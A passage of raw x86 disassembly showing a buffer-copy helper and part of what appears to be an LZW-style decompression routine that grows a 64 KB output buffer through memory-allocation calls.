  405cf8:	cc                   	int3
  405cf9:	cc                   	int3
  405cfa:	cc                   	int3
  405cfb:	cc                   	int3
  405cfc:	cc                   	int3
  405cfd:	cc                   	int3
  405cfe:	cc                   	int3
  405cff:	cc                   	int3
  405d00:	55                   	push   %ebp
  405d01:	8b ec                	mov    %esp,%ebp
  405d03:	83 ec 0c             	sub    $0xc,%esp
  405d06:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405d09:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405d0c:	83 38 00             	cmpl   $0x0,(%eax)
  405d0f:	75 05                	jne    0x405d16
  405d11:	83 c8 ff             	or     $0xffffffff,%eax
  405d14:	eb 7f                	jmp    0x405d95
  405d16:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405d19:	e8 a2 ff ff ff       	call   0x405cc0
  405d1e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405d21:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405d24:	3b 4d f8             	cmp    -0x8(%ebp),%ecx
  405d27:	7e 06                	jle    0x405d2f
  405d29:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405d2c:	89 55 0c             	mov    %edx,0xc(%ebp)
  405d2f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405d33:	74 16                	je     0x405d4b
  405d35:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d38:	50                   	push   %eax
  405d39:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405d3c:	8b 11                	mov    (%ecx),%edx
  405d3e:	52                   	push   %edx
  405d3f:	8b 45 08             	mov    0x8(%ebp),%eax
  405d42:	50                   	push   %eax
  405d43:	e8 0a 1c 00 00       	call   0x407952
  405d48:	83 c4 0c             	add    $0xc,%esp
  405d4b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405d4e:	2b 4d 0c             	sub    0xc(%ebp),%ecx
  405d51:	51                   	push   %ecx
  405d52:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405d55:	8b 02                	mov    (%edx),%eax
  405d57:	03 45 0c             	add    0xc(%ebp),%eax
  405d5a:	50                   	push   %eax
  405d5b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405d5e:	8b 11                	mov    (%ecx),%edx
  405d60:	52                   	push   %edx
  405d61:	e8 ec 1b 00 00       	call   0x407952
  405d66:	83 c4 0c             	add    $0xc,%esp
  405d69:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405d6c:	8b 48 04             	mov    0x4(%eax),%ecx
  405d6f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405d72:	8b 55 0c             	mov    0xc(%ebp),%edx
  405d75:	c1 e2 03             	shl    $0x3,%edx
  405d78:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d7b:	2b c2                	sub    %edx,%eax
  405d7d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d80:	79 07                	jns    0x405d89
  405d82:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  405d89:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405d8c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405d8f:	89 51 04             	mov    %edx,0x4(%ecx)
  405d92:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d95:	8b e5                	mov    %ebp,%esp
  405d97:	5d                   	pop    %ebp
  405d98:	c2 08 00             	ret    $0x8
  405d9b:	cc                   	int3
  405d9c:	cc                   	int3
  405d9d:	cc                   	int3
  405d9e:	cc                   	int3
  405d9f:	cc                   	int3
  405da0:	55                   	push   %ebp
  405da1:	8b ec                	mov    %esp,%ebp
  405da3:	b8 9c 00 01 00       	mov    $0x1009c,%eax
  405da8:	e8 73 1b 00 00       	call   0x407920
  405dad:	89 8d 64 ff fe ff    	mov    %ecx,-0x1009c(%ebp)
  405db3:	c7 45 d0 00 00 01 00 	movl   $0x10000,-0x30(%ebp)
  405dba:	c7 85 b8 ff fe ff 00 	movl   $0x0,-0x10048(%ebp)
  405dc1:	00 00 00 
  405dc4:	68 00 00 01 00       	push   $0x10000
  405dc9:	6a 42                	push   $0x42
  405dcb:	ff 15 20 90 40 00    	call   *0x409020
  405dd1:	89 85 b8 ff fe ff    	mov    %eax,-0x10048(%ebp)
  405dd7:	83 bd b8 ff fe ff 00 	cmpl   $0x0,-0x10048(%ebp)
  405dde:	75 07                	jne    0x405de7
  405de0:	33 c0                	xor    %eax,%eax
  405de2:	e9 bd 08 00 00       	jmp    0x4066a4
  405de7:	8b 85 b8 ff fe ff    	mov    -0x10048(%ebp),%eax
  405ded:	50                   	push   %eax
  405dee:	ff 15 1c 90 40 00    	call   *0x40901c
  405df4:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  405df7:	68 00 00 01 00       	push   $0x10000
  405dfc:	6a 00                	push   $0x0
  405dfe:	8d 8d c0 ff fe ff    	lea    -0x10040(%ebp),%ecx
  405e04:	51                   	push   %ecx
  405e05:	e8 0a 1b 00 00       	call   0x407914
  405e0a:	83 c4 0c             	add    $0xc,%esp
  405e0d:	c7 85 bc ff fe ff 00 	movl   $0x0,-0x10044(%ebp)
  405e14:	00 00 00 
  405e17:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  405e1e:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  405e25:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  405e2b:	c7 42 20 00 00 00 00 	movl   $0x0,0x20(%edx)
  405e32:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  405e38:	c7 40 24 00 00 00 00 	movl   $0x0,0x24(%eax)
  405e3f:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  405e46:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  405e4d:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  405e53:	c7 41 18 00 00 00 00 	movl   $0x0,0x18(%ecx)
  405e5a:	68 a0 0f 00 00       	push   $0xfa0
  405e5f:	e8 f4 1a 00 00       	call   0x407958
  405e64:	83 c4 04             	add    $0x4,%esp
  405e67:	89 85 7c ff fe ff    	mov    %eax,-0x10084(%ebp)
  405e6d:	8b 95 7c ff fe ff    	mov    -0x10084(%ebp),%edx
  405e73:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  405e76:	68 a0 0f 00 00       	push   $0xfa0
  405e7b:	e8 d8 1a 00 00       	call   0x407958
  405e80:	83 c4 04             	add    $0x4,%esp
  405e83:	89 85 78 ff fe ff    	mov    %eax,-0x10088(%ebp)
  405e89:	8b 85 78 ff fe ff    	mov    -0x10088(%ebp),%eax
  405e8f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  405e92:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405e95:	51                   	push   %ecx
  405e96:	e8 bd 1a 00 00       	call   0x407958
  405e9b:	83 c4 04             	add    $0x4,%esp
  405e9e:	89 85 74 ff fe ff    	mov    %eax,-0x1008c(%ebp)
  405ea4:	8b 95 74 ff fe ff    	mov    -0x1008c(%ebp),%edx
  405eaa:	89 55 d8             	mov    %edx,-0x28(%ebp)
  405ead:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  405eb3:	e8 f8 f3 ff ff       	call   0x4052b0
  405eb8:	c7 45 e0 09 00 00 00 	movl   $0x9,-0x20(%ebp)
  405ebf:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  405ec5:	c7 40 1c 02 01 00 00 	movl   $0x102,0x1c(%eax)
  405ecc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405ecf:	8d 14 cd a0 00 00 00 	lea    0xa0(,%ecx,8),%edx
  405ed6:	52                   	push   %edx
  405ed7:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  405edd:	83 c1 08             	add    $0x8,%ecx
  405ee0:	e8 5b f9 ff ff       	call   0x405840
  405ee5:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  405eec:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  405ef3:	b8 01 00 00 00       	mov    $0x1,%eax
  405ef8:	85 c0                	test   %eax,%eax
  405efa:	0f 84 eb 06 00 00    	je     0x4065eb
  405f00:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  405f06:	83 c1 08             	add    $0x8,%ecx
  405f09:	e8 c2 f9 ff ff       	call   0x4058d0
  405f0e:	83 f8 05             	cmp    $0x5,%eax
  405f11:	0f 83 c4 00 00 00    	jae    0x405fdb
  405f17:	66 8b 4d fc          	mov    -0x4(%ebp),%cx
  405f1b:	66 89 8d ac ff fe ff 	mov    %cx,-0x10054(%ebp)
  405f22:	0f b7 95 ac ff fe ff 	movzwl -0x10054(%ebp),%edx
  405f29:	03 55 c8             	add    -0x38(%ebp),%edx
  405f2c:	3b 55 0c             	cmp    0xc(%ebp),%edx
  405f2f:	76 0d                	jbe    0x405f3e
  405f31:	8b 45 0c             	mov    0xc(%ebp),%eax
  405f34:	2b 45 c8             	sub    -0x38(%ebp),%eax
  405f37:	66 89 85 ac ff fe ff 	mov    %ax,-0x10054(%ebp)
  405f3e:	0f b7 8d ac ff fe ff 	movzwl -0x10054(%ebp),%ecx
  405f45:	85 c9                	test   %ecx,%ecx
  405f47:	0f 84 8e 00 00 00    	je     0x405fdb
  405f4d:	0f b7 95 ac ff fe ff 	movzwl -0x10054(%ebp),%edx
  405f54:	89 95 a8 ff fe ff    	mov    %edx,-0x10058(%ebp)
  405f5a:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  405f60:	8b 48 20             	mov    0x20(%eax),%ecx
  405f63:	03 8d a8 ff fe ff    	add    -0x10058(%ebp),%ecx
  405f69:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  405f6c:	7e 12                	jle    0x405f80
  405f6e:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  405f74:	8b 45 0c             	mov    0xc(%ebp),%eax
  405f77:	2b 42 20             	sub    0x20(%edx),%eax
  405f7a:	89 85 a8 ff fe ff    	mov    %eax,-0x10058(%ebp)
  405f80:	8b 8d a8 ff fe ff    	mov    -0x10058(%ebp),%ecx
  405f86:	51                   	push   %ecx
  405f87:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  405f8d:	8b 45 08             	mov    0x8(%ebp),%eax
  405f90:	03 42 20             	add    0x20(%edx),%eax
  405f93:	50                   	push   %eax
  405f94:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  405f97:	51                   	push   %ecx
  405f98:	e8 b5 19 00 00       	call   0x407952
  405f9d:	83 c4 0c             	add    $0xc,%esp
  405fa0:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  405fa6:	8b 42 20             	mov    0x20(%edx),%eax
  405fa9:	03 85 a8 ff fe ff    	add    -0x10058(%ebp),%eax
  405faf:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  405fb5:	89 41 20             	mov    %eax,0x20(%ecx)
  405fb8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405fbb:	52                   	push   %edx
  405fbc:	8b 45 d8             	mov    -0x28(%ebp),%eax
  405fbf:	50                   	push   %eax
  405fc0:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  405fc6:	83 c1 08             	add    $0x8,%ecx
  405fc9:	e8 12 fa ff ff       	call   0x4059e0
  405fce:	0f b7 8d ac ff fe ff 	movzwl -0x10054(%ebp),%ecx
  405fd5:	03 4d c8             	add    -0x38(%ebp),%ecx
  405fd8:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  405fdb:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  405fe1:	8b 42 1c             	mov    0x1c(%edx),%eax
  405fe4:	83 c0 01             	add    $0x1,%eax
  405fe7:	89 85 b4 ff fe ff    	mov    %eax,-0x1004c(%ebp)
  405fed:	8b 8d b4 ff fe ff    	mov    -0x1004c(%ebp),%ecx
  405ff3:	c1 f9 09             	sar    $0x9,%ecx
  405ff6:	89 8d b4 ff fe ff    	mov    %ecx,-0x1004c(%ebp)
  405ffc:	c7 45 e0 09 00 00 00 	movl   $0x9,-0x20(%ebp)
  406003:	83 bd b4 ff fe ff 00 	cmpl   $0x0,-0x1004c(%ebp)
  40600a:	7e 19                	jle    0x406025
  40600c:	8b 95 b4 ff fe ff    	mov    -0x1004c(%ebp),%edx
  406012:	d1 fa                	sar    $1,%edx
  406014:	89 95 b4 ff fe ff    	mov    %edx,-0x1004c(%ebp)
  40601a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40601d:	83 c0 01             	add    $0x1,%eax
  406020:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406023:	eb de                	jmp    0x406003
  406025:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406028:	51                   	push   %ecx
  406029:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  40602f:	83 c1 08             	add    $0x8,%ecx
  406032:	e8 d9 f8 ff ff       	call   0x405910
  406037:	66 89 85 b0 ff fe ff 	mov    %ax,-0x10050(%ebp)
  40603e:	0f b7 95 b0 ff fe ff 	movzwl -0x10050(%ebp),%edx
  406045:	81 fa 01 01 00 00    	cmp    $0x101,%edx
  40604b:	75 05                	jne    0x406052
  40604d:	e9 99 05 00 00       	jmp    0x4065eb
  406052:	0f b7 85 b0 ff fe ff 	movzwl -0x10050(%ebp),%eax
  406059:	3d 00 01 00 00       	cmp    $0x100,%eax
  40605e:	0f 85 9f 01 00 00    	jne    0x406203
  406064:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  40606a:	e8 41 f2 ff ff       	call   0x4052b0
  40606f:	6a 09                	push   $0x9
  406071:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  406077:	83 c1 08             	add    $0x8,%ecx
  40607a:	e8 91 f8 ff ff       	call   0x405910
  40607f:	66 89 85 b0 ff fe ff 	mov    %ax,-0x10050(%ebp)
  406086:	0f b7 8d b0 ff fe ff 	movzwl -0x10050(%ebp),%ecx
  40608d:	81 f9 01 01 00 00    	cmp    $0x101,%ecx
  406093:	75 05                	jne    0x40609a
  406095:	e9 51 05 00 00       	jmp    0x4065eb
  40609a:	0f b7 95 b0 ff fe ff 	movzwl -0x10050(%ebp),%edx
  4060a1:	52                   	push   %edx
  4060a2:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  4060a8:	e8 d3 f2 ff ff       	call   0x405380
  4060ad:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4060b0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4060b3:	89 85 a4 ff fe ff    	mov    %eax,-0x1005c(%ebp)
  4060b9:	83 bd a4 ff fe ff 00 	cmpl   $0x0,-0x1005c(%ebp)
  4060c0:	0f 84 20 01 00 00    	je     0x4061e6
  4060c6:	8b 8d a4 ff fe ff    	mov    -0x1005c(%ebp),%ecx
  4060cc:	66 8b 11             	mov    (%ecx),%dx
  4060cf:	66 89 95 a0 ff fe ff 	mov    %dx,-0x10060(%ebp)
  4060d6:	8b 85 a4 ff fe ff    	mov    -0x1005c(%ebp),%eax
  4060dc:	83 c0 02             	add    $0x2,%eax
  4060df:	89 85 a4 ff fe ff    	mov    %eax,-0x1005c(%ebp)
  4060e5:	c7 85 9c ff fe ff 00 	movl   $0x0,-0x10064(%ebp)
  4060ec:	00 00 00 
  4060ef:	eb 0f                	jmp    0x406100
  4060f1:	8b 8d 9c ff fe ff    	mov    -0x10064(%ebp),%ecx
  4060f7:	83 c1 01             	add    $0x1,%ecx
  4060fa:	89 8d 9c ff fe ff    	mov    %ecx,-0x10064(%ebp)
  406100:	0f b7 95 a0 ff fe ff 	movzwl -0x10060(%ebp),%edx
  406107:	39 95 9c ff fe ff    	cmp    %edx,-0x10064(%ebp)
  40610d:	0f 83 ba 00 00 00    	jae    0x4061cd
  406113:	81 bd bc ff fe ff 00 	cmpl   $0x10000,-0x10044(%ebp)
  40611a:	00 01 00 
  40611d:	7c 6d                	jl     0x40618c
  40611f:	68 00 00 01 00       	push   $0x10000
  406124:	8d 85 c0 ff fe ff    	lea    -0x10040(%ebp),%eax
  40612a:	50                   	push   %eax
  40612b:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40612e:	03 4d ec             	add    -0x14(%ebp),%ecx
  406131:	51                   	push   %ecx
  406132:	e8 1b 18 00 00       	call   0x407952
  406137:	83 c4 0c             	add    $0xc,%esp
  40613a:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40613d:	81 c2 00 00 01 00    	add    $0x10000,%edx
  406143:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406146:	c7 85 bc ff fe ff 00 	movl   $0x0,-0x10044(%ebp)
  40614d:	00 00 00 
  406150:	8b 85 b8 ff fe ff    	mov    -0x10048(%ebp),%eax
  406156:	50                   	push   %eax
  406157:	ff 15 18 90 40 00    	call   *0x409018
  40615d:	6a 00                	push   $0x0
  40615f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406162:	81 c1 00 00 01 00    	add    $0x10000,%ecx
  406168:	51                   	push   %ecx
  406169:	8b 95 b8 ff fe ff    	mov    -0x10048(%ebp),%edx
  40616f:	52                   	push   %edx
  406170:	ff 15 14 90 40 00    	call   *0x409014
  406176:	89 85 b8 ff fe ff    	mov    %eax,-0x10048(%ebp)
  40617c:	8b 85 b8 ff fe ff    	mov    -0x10048(%ebp),%eax
  406182:	50                   	push   %eax
  406183:	ff 15 1c 90 40 00    	call   *0x40901c
  406189:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40618c:	8b 8d bc ff fe ff    	mov    -0x10044(%ebp),%ecx
  406192:	8b 95 a4 ff fe ff    	mov    -0x1005c(%ebp),%edx
  406198:	8a 02                	mov    (%edx),%al
  40619a:	88 84 0d c0 ff fe ff 	mov    %al,-0x10040(%ebp,%ecx,1)
  4061a1:	8b 8d bc ff fe ff    	mov    -0x10044(%ebp),%ecx
  4061a7:	83 c1 01             	add    $0x1,%ecx
  4061aa:	89 8d bc ff fe ff    	mov    %ecx,-0x10044(%ebp)
  4061b0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4061b3:	83 c2 01             	add    $0x1,%edx
  4061b6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4061b9:	8b 85 a4 ff fe ff    	mov    -0x1005c(%ebp),%eax
  4061bf:	83 c0 01             	add    $0x1,%eax
  4061c2:	89 85 a4 ff fe ff    	mov    %eax,-0x1005c(%ebp)
  4061c8:	e9 24 ff ff ff       	jmp    0x4060f1
  4061cd:	0f b7 8d a0 ff fe ff 	movzwl -0x10060(%ebp),%ecx
  4061d4:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  4061da:	03 4a 18             	add    0x18(%edx),%ecx
  4061dd:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  4061e3:	89 48 18             	mov    %ecx,0x18(%eax)
  4061e6:	66 8b 8d b0 ff fe ff 	mov    -0x10050(%ebp),%cx
  4061ed:	66 89 4d f8          	mov    %cx,-0x8(%ebp)
  4061f1:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  4061f7:	c7 42 1c 02 01 00 00 	movl   $0x102,0x1c(%edx)
  4061fe:	e9 e3 03 00 00       	jmp    0x4065e6
  406203:	0f b7 85 b0 ff fe ff 	movzwl -0x10050(%ebp),%eax
  40620a:	50                   	push   %eax
  40620b:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  406211:	e8 6a f1 ff ff       	call   0x405380
  406216:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406219:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40621d:	0f 84 d4 01 00 00    	je     0x4063f7
  406223:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406226:	8a 51 02             	mov    0x2(%ecx),%dl
  406229:	88 55 df             	mov    %dl,-0x21(%ebp)
  40622c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40622f:	89 85 98 ff fe ff    	mov    %eax,-0x10068(%ebp)
  406235:	83 bd 98 ff fe ff 00 	cmpl   $0x0,-0x10068(%ebp)
  40623c:	0f 84 20 01 00 00    	je     0x406362
  406242:	8b 8d 98 ff fe ff    	mov    -0x10068(%ebp),%ecx
  406248:	66 8b 11             	mov    (%ecx),%dx
  40624b:	66 89 95 94 ff fe ff 	mov    %dx,-0x1006c(%ebp)
  406252:	8b 85 98 ff fe ff    	mov    -0x10068(%ebp),%eax
  406258:	83 c0 02             	add    $0x2,%eax
  40625b:	89 85 98 ff fe ff    	mov    %eax,-0x10068(%ebp)
  406261:	c7 85 90 ff fe ff 00 	movl   $0x0,-0x10070(%ebp)
  406268:	00 00 00 
  40626b:	eb 0f                	jmp    0x40627c
  40626d:	8b 8d 90 ff fe ff    	mov    -0x10070(%ebp),%ecx
  406273:	83 c1 01             	add    $0x1,%ecx
  406276:	89 8d 90 ff fe ff    	mov    %ecx,-0x10070(%ebp)
  40627c:	0f b7 95 94 ff fe ff 	movzwl -0x1006c(%ebp),%edx
  406283:	39 95 90 ff fe ff    	cmp    %edx,-0x10070(%ebp)
  406289:	0f 83 ba 00 00 00    	jae    0x406349
  40628f:	81 bd bc ff fe ff 00 	cmpl   $0x10000,-0x10044(%ebp)
  406296:	00 01 00 
  406299:	7c 6d                	jl     0x406308
  40629b:	68 00 00 01 00       	push   $0x10000
  4062a0:	8d 85 c0 ff fe ff    	lea    -0x10040(%ebp),%eax
  4062a6:	50                   	push   %eax
  4062a7:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4062aa:	03 4d ec             	add    -0x14(%ebp),%ecx
  4062ad:	51                   	push   %ecx
  4062ae:	e8 9f 16 00 00       	call   0x407952
  4062b3:	83 c4 0c             	add    $0xc,%esp
  4062b6:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4062b9:	81 c2 00 00 01 00    	add    $0x10000,%edx
  4062bf:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4062c2:	c7 85 bc ff fe ff 00 	movl   $0x0,-0x10044(%ebp)
  4062c9:	00 00 00 
  4062cc:	8b 85 b8 ff fe ff    	mov    -0x10048(%ebp),%eax
  4062d2:	50                   	push   %eax
  4062d3:	ff 15 18 90 40 00    	call   *0x409018
  4062d9:	6a 00                	push   $0x0
  4062db:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4062de:	81 c1 00 00 01 00    	add    $0x10000,%ecx
  4062e4:	51                   	push   %ecx
  4062e5:	8b 95 b8 ff fe ff    	mov    -0x10048(%ebp),%edx
  4062eb:	52                   	push   %edx
  4062ec:	ff 15 14 90 40 00    	call   *0x409014
  4062f2:	89 85 b8 ff fe ff    	mov    %eax,-0x10048(%ebp)
  4062f8:	8b 85 b8 ff fe ff    	mov    -0x10048(%ebp),%eax
  4062fe:	50                   	push   %eax
  4062ff:	ff 15 1c 90 40 00    	call   *0x40901c
  406305:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  406308:	8b 8d bc ff fe ff    	mov    -0x10044(%ebp),%ecx
  40630e:	8b 95 98 ff fe ff    	mov    -0x10068(%ebp),%edx
  406314:	8a 02                	mov    (%edx),%al
  406316:	88 84 0d c0 ff fe ff 	mov    %al,-0x10040(%ebp,%ecx,1)
  40631d:	8b 8d bc ff fe ff    	mov    -0x10044(%ebp),%ecx
  406323:	83 c1 01             	add    $0x1,%ecx
  406326:	89 8d bc ff fe ff    	mov    %ecx,-0x10044(%ebp)
  40632c:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40632f:	83 c2 01             	add    $0x1,%edx
  406332:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406335:	8b 85 98 ff fe ff    	mov    -0x10068(%ebp),%eax
  40633b:	83 c0 01             	add    $0x1,%eax
  40633e:	89 85 98 ff fe ff    	mov    %eax,-0x10068(%ebp)
  406344:	e9 24 ff ff ff       	jmp    0x40626d
  406349:	0f b7 8d 94 ff fe ff 	movzwl -0x1006c(%ebp),%ecx
  406350:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  406356:	03 4a 18             	add    0x18(%edx),%ecx
  406359:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  40635f:	89 48 18             	mov    %ecx,0x18(%eax)
  406362:	0f b7 4d f8          	movzwl -0x8(%ebp),%ecx
  406366:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40636c:	74 79                	je     0x4063e7
  40636e:	0f b7 55 f8          	movzwl -0x8(%ebp),%edx
  406372:	52                   	push   %edx
  406373:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  406379:	e8 02 f0 ff ff       	call   0x405380
  40637e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406381:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406384:	66 8b 08             	mov    (%eax),%cx
  406387:	66 89 4d cc          	mov    %cx,-0x34(%ebp)
  40638b:	0f b7 55 cc          	movzwl -0x34(%ebp),%edx
  40638f:	52                   	push   %edx
  406390:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406393:	83 c0 02             	add    $0x2,%eax
  406396:	50                   	push   %eax
  406397:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40639a:	51                   	push   %ecx
  40639b:	e8 b2 15 00 00       	call   0x407952
  4063a0:	83 c4 0c             	add    $0xc,%esp
  4063a3:	0f b7 55 cc          	movzwl -0x34(%ebp),%edx
  4063a7:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4063aa:	8a 4d df             	mov    -0x21(%ebp),%cl
  4063ad:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  4063b0:	0f b7 55 cc          	movzwl -0x34(%ebp),%edx
  4063b4:	83 c2 01             	add    $0x1,%edx
  4063b7:	52                   	push   %edx
  4063b8:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4063bb:	50                   	push   %eax
  4063bc:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  4063c2:	0f b7 51 1c          	movzwl 0x1c(%ecx),%edx
  4063c6:	52                   	push   %edx
  4063c7:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  4063cd:	e8 ce ef ff ff       	call   0x4053a0
  4063d2:	8b 85 64 ff fe ff    	mov    -0x1009c(%ebp),%eax
  4063d8:	8b 48 1c             	mov    0x1c(%eax),%ecx
  4063db:	83 c1 01             	add    $0x1,%ecx
  4063de:	8b 95 64 ff fe ff    	mov    -0x1009c(%ebp),%edx
  4063e4:	89 4a 1c             	mov    %ecx,0x1c(%edx)
  4063e7:	66 8b 85 b0 ff fe ff 	mov    -0x10050(%ebp),%ax
  4063ee:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  4063f2:	e9 ef 01 00 00       	jmp    0x4065e6
  4063f7:	0f b7 4d f8          	movzwl -0x8(%ebp),%ecx
  4063fb:	51                   	push   %ecx
  4063fc:	8b 8d 64 ff fe ff    	mov    -0x1009c(%ebp),%ecx
  406402:	e8 79 ef ff ff       	call   0x405380
  406407:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40640a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40640d:	8a 42 02             	mov    0x2(%edx),%al
  406410:	88 45 df             	mov    %al,-0x21(%ebp)
  406413:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406416:	66 8b 11             	mov    (%ecx),%dx
  406419:	66 89 55 cc          	mov    %dx,-0x34(%ebp)
  40641d:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  406421:	50                   	push   %eax
  406422:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406425:	83 c1 02             	add    $0x2,%ecx
  406428:	51                   	push   %ecx
  406429:	8b 55 c0             	mov    -0x40(%ebp),%edx
  40642c:	83 c2 02             	add    $0x2,%edx
  40642f:	52                   	push   %edx
  406430:	e8 1d 15 00 00       	call   0x407952
  406435:	83 c4 0c             	add    $0xc,%esp
  406438:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  40643c:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  40643f:	8a 55 df             	mov    -0x21(%ebp),%dl
  406442:	88 54 01 02          	mov    %dl,0x2(%ecx,%eax,1)
  406446:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  40644a:	83 c0 01             	add    $0x1,%eax
  40644d:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  406450:	66 89 01             	mov    %ax,(%ecx)
  406453:	8b 55 c0             	mov    -0x40(%ebp),%edx
  406456:	89 95 8c ff fe ff    	mov    %edx,-0x10074(%ebp)
  40645c:	83 bd 8c ff fe ff 00 	cmpl   $0x0,-0x10074(%ebp)
  406463:	0f 84 1f 01 00 00    	je     0x406588
  406469:	8b 85 8c ff fe ff    	mov    -0x10074(%ebp),%eax
  40646f:	66 8b 08             	mov    (%eax),%cx
  406472:	66 89 8d 88 ff fe ff 	mov    %cx,-0x10078(%ebp)
  406479:	8b 95 8c ff fe ff    	mov    -0x10074(%ebp),%edx
  40647f:	83 c2 02             	add    $0x2,%edx
  406482:	89 95 8c ff fe ff    	mov    %edx,-0x10074(%ebp)
  406488:	c7 85 84 ff fe ff 00 	movl   $0x0,-0x1007c(%ebp)
  40648f:	00 00 00 
  406492:	eb 0f                	jmp    0x4064a3
  406494:	8b 85 84 ff fe ff    	mov    -0x1007c(%ebp),%eax
  40649a:	83 c0 01             	add    $0x1,%eax
  40649d:	89 85 84 ff fe ff    	mov    %eax,-0x1007c(%ebp)
  4064a3:	0f b7 8d 88 ff fe ff 	movzwl -0x10078(%ebp),%ecx
